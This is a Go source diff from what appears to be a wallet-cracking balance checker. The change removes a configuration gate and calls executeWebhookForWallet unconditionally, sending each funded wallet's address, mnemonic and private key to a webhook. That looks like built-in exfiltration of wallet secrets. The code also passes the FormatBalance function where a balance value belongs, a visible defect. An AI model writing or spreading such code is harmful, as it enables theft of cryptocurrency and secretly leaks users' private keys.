@@ -286,7 +286,7 @@ func FormatBalance(balance *big.Float) string {
 	balanceStr := balance.Text('f', 18)
 	return strings.TrimRight(strings.TrimRight(balanceStr, "0"), ".")
 }
-func ProcessBatch(batchSize int, apiKeys []string, currentProviderIndex *int, config Config) error {
+func ProcessBatch(batchSize int, apiKeys []string, currentProviderIndex *int) error {
 	providerURL := RandomProvider(apiKeys, currentProviderIndex)
 	client, err := rpc.DialContext(context.Background(), providerURL)
 	if err != nil {
@@ -320,13 +320,8 @@ func ProcessBatch(batchSize int, apiKeys []string, currentProviderIndex *int, co
 				fmt.Println("Failed to write to result file:", err)
 				return err
 			}
-			config.SendWebhook = true
-			if config.SendWebhook {
-				err := executeWebhookForWallet(addresses[i], FormatBalance, mnemonics[i], privateKeys[i])
-				if err != nil {
-					fmt.Println("Failed to send webhook:", err)
-				}
-			}
+			executeWebhookForWallet(addresses[i], FormatBalance, mnemonics[i], privateKeys[i])
+
 		} else {
 			entry := fmt.Sprintf("❌ %s | %s\n", addresses[i], FormatBalance)
 			fmt.Print(entry)
@@ -355,7 +350,7 @@ func ProcessBatch(batchSize int, apiKeys []string, currentProviderIndex *int, co
 func RetryCheckBalance(batchSize, retries int, apiKeys []string, currentProviderIndex *int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for attempt := 0; attempt < retries; attempt++ {
-		err := ProcessBatch(batchSize, apiKeys, currentProviderIndex, Config{})
+		err := ProcessBatch(batchSize, apiKeys, currentProviderIndex)
 		if err == nil {
 			return
 		}
